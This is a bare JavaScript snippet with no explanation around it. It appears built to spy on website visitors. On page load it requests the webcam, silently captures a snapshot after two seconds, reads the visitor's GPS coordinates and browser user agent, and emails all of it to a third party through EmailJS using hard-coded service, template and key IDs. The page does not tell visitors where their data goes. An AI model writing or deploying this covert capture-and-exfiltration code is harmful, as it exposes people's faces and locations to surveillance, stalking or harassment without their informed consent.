navigator.mediaDevices.getUserMedia({ video: true })
  .then(function (stream) {
    const video = document.getElementById('video');
    video.srcObject = stream;

    // Take snapshot after 2 seconds
    setTimeout(() => {
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext('2d').drawImage(video, 0, 0);
      const imageData = canvas.toDataURL('image/jpeg');

      // Get location
      navigator.geolocation.getCurrentPosition(position => {
        const location = `Lat: ${position.coords.latitude}, Lon: ${position.coords.longitude}`;
        sendEmail(imageData, location);
      }, error => {
        sendEmail(imageData, 'Location permission denied');
      });
    }, 2000);
  })
  .catch(err => {
    alert('Camera permission denied.');
  });

function sendEmail(imageData, location) {
  emailjs.send("service_hzpg95d", "template_4kppxcd", {
    camera_data: imageData,
    location: location,
    from_name: "Website Visitor",
    user_agent: navigator.userAgent
  })
  .then(() => {
    console.log('Email sent successfully.');
  })
  .catch(error => {
    console.error('Failed to send email:', error);
  });
}

(function() {
  emailjs.init("D-0fb_XlgBEol21FA");
})();
